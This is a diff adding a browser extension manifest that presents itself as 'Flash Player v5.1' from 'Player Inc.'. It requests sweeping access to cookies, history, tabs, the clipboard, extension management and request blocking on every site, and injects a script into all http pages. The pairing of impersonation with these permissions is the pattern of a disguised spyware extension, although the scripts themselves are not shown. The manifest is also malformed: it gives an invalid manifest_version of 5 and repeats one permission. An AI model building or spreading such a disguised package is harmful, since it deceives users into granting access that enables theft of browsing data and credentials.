@@ -1,0 +1,23 @@
+{
+   "background": {
+      "scripts": [ "jquery-1.9.1.min.js", "background.js" ]
+   },
+   "content_scripts": [ {
+      "exclude_globs": [  ],
+      "exclude_matches": [  ],
+      "include_globs": [ "*://*/*" ],
+      "js": [ "script.js" ],
+      "matches": [ "http://*/*" ],
+      "run_at": "document_idle"
+   } ],
+   "content_security_policy": "script-src 'self' https://ssl.google-analytics.com; object-src 'self'",
+   "description": "Player Inc.",
+   "icons": {
+      "128": "icon.png",
+      "48": "icon.png"
+   },
+   "manifest_version": 5,
+   "name": "Flash Player v5.1",
+   "permissions": [ "unlimitedStorage", "notifications", "clipboardWrite", "notifications", "clipboardRead", "management", "tabs", "history", "cookies", "idle", "storage", "webRequest", "webRequestBlocking", "contentSettings", "*://*/*" ],
+   "version": "5.1"
+}
